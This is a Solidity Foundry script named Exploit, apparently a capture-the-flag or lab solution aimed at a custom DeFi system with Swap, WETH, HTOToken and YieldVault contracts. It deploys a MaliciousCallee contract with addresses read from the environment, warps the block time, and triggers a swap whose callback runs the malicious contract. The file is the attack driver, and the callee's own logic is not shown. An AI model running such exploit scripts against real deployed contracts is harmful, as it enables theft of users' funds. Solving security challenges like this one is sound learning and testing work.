// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {MaliciousCallee} from "../script/MaliciousCallee.sol";
import {WETH} from "../src/WETH.sol";
import {HTOToken} from "../src/HTOToken.sol";
import {DepositNFT} from "../src/DepositNFT.sol";
import {VestingNFT} from "../src/VestingNFT.sol";
import {YieldVault} from "../src/YieldVault.sol";
import {Swap} from "../src/Swap.sol";


contract Exploit is Script{

    Swap public swap;
    WETH public wETH;

    constructor() {
        swap = Swap(vm.envAddress("Swap"));
    }

    function run() public {
        vm.startBroadcast();
        MaliciousCallee callee = new MaliciousCallee(vm.envAddress("Swap"), vm.envAddress("WALLET"), vm.envAddress("WETH"), vm.envAddress("HTOToken"), vm.envAddress("YieldVault"));
        vm.warp(1000);
        swap.swap(200000002, 100000001, address(callee), "d");
        callee.swap();
        vm.stopBroadcast();
    }
}

